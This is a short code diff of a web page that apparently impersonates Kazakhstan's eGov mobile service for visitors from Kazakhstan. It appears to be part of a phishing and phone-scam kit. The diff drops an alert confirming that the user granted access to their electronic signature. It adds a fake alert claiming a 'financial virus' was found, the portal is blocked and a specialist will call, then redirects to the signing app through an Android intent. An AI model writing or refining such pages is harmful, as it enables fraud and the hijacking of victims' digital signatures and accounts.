@@ -174,12 +174,12 @@ if (data.country === "KZ") {
       await wait(1000);
       document.getElementById('overlay1').classList.remove('show');
 */
-      await wait(1000);
+       await wait(1000);
       document.getElementById('overlay2').classList.add('show');
       await wait(1000);
-      alert('✔️ Вы успешно предоставили доступ к ЭЦП eGov mobile')
-      await wait(1000);
       document.getElementById('overlay2').classList.remove('show');
+      await wait(1000);
+      alert('⚠️eGov mobile: Внимание! Зафиксирован финансовый вирус. Доступ к порталу временно заблокирван. Ожидайте звонок специалиста')
 
       await wait(500);
       window.location = "intent://#Intent;scheme=mgovsign;package=kz.mobile.mgov;end";
@@ -203,6 +203,7 @@ if (data.country === "KZ") {
 
 
 </html>
+
 
 
 
